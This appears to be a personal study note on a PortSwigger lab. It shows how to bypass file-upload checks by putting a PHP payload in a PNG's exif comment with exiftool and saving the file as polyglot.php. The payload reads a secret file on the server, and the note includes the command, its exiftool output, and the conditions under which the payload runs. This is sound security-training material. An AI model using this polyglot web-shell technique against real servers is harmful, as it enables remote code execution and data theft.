
Date: 2025-09-25
Tags: 
Links:  [[WSA]], [[File Upload Vulnerabilities]]

***
メタデータの書き換えによるバイパス

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.

**exiftool**によってメタデータを書き換えられる。


## Lab

1. 拡張子、MIME書き換えでも無理
2. メタデータを書き換える。
3. pngファイルのexifコメントヘッダにペイロードを挿入。拡張子はphpに。
```sh
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.png -o polyglot.php
```

```sh
exiftool polyglot.php

ExifTool Version Number         : 13.25
File Name                       : polyglot.php
Directory                       : .
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 204
Image Height                    : 232
Bit Depth                       : 8
Color Type                      : RGB with Alpha
XMP Toolkit                     : XMP Core 6.0.0
Comment                         : <?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
Image Size                      : 204x232
```

4. アクセスするとコメントヘッダに書いたスクリプトが実行される。

>拡張子がpngのままだと実行されない。
***
# References

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload